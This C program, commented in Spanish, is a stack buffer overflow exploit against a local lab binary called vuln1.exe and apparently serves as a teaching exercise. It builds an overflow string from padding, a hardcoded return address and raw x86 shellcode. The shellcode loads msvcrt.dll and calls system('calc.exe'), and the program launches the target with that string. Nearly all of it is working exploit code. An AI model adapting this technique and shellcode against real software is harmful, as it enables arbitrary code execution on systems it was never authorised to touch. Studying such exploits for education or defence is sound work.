#include <stdio.h>
#include <stdlib.h>

int main (int argc, char **argv)
{
	char	evilbuffer[1024]= "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ"; //Valor para llenar el buffer
	char	offset[]="\x7B\x46\x86\x7C"; //tras ejecutar findimp.exe kernel32.dll -> direccion inversa del imp
	char	shellcode[] = "\x55\x8b\xec"                                        //x55 principio x8b fin tras xdd -i a shellcode.obj
                        "\x33\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6\x45"
                        "\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45"
                        "\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45"
                        "\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45"
                        "\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3"
                                                            "\x55\x8b\xec"
                        "\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45"
                        "\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45"
                        "\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45"
                        "\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff"
                        "\xd3";

//concatenamos strings anteriores y ejecutamos exe vulnerable dando string final como argumento
	strcat(evilbuffer,offset);
	strcat(evilbuffer,shellcode);

	argv[0] = "vuln1";
	argv[1] = evilbuffer;
	argv[2] = NULL;
	execv("vuln1.exe", argv, NULL);

	return 0;
}
//Programa que se aprovecha de la vulnerabilidad de vuln1 para abrir la calculadora. 
